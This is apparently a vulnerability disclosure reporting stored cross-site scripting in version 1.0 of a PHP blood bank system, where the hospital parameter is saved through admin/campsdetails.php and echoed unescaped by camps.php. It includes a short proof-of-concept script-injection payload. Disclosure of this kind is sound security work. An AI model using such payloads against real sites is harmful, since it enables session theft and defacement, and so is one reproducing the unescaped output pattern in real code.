# blood-bank-system-in-php has Cross Site Scripting via camps.php $hospital parameter 

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

# AFFECTED  VERSION(S)

## Vulnerable File

admin/campsdetails.php and /camps.php $hospital parameter.

## VERSION(S)

-  v1.0

## Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

# PROBLEM TYPE

## Vulnerability Type

Cross Site Scripting

## **Description of the vulnerability**

/admin/campsdetails.php insert the $hospital parameter into camps tables.

![image-20241006020549104](https://github.com/user-attachments/assets/237eff19-ca1c-4e16-bba7-380f91b4f10d)

camps.php echo $hospital value from camps table.

![image-20241006020623440](https://github.com/user-attachments/assets/0b9f81a3-7e3f-46c4-b05c-e9443502f87f)

## **Vulnerability recurrence**

### **POC**

```
http://bloodbankmgmtsystem/admin/campsdetails.php
contact=2&hospital=<script>alert("hospitalXss");</script>
```

![image-20241006014220718](https://github.com/user-attachments/assets/e3935877-cff9-435f-bd98-bfa20f830108)

### Result

asset /camps.php alert 'hospitalXss'.

```
http://bloodbankmgmtsystem/camps.php
```

![image-20241006014121493](https://github.com/user-attachments/assets/9b75188a-af7d-464a-a155-9badd848ce5b)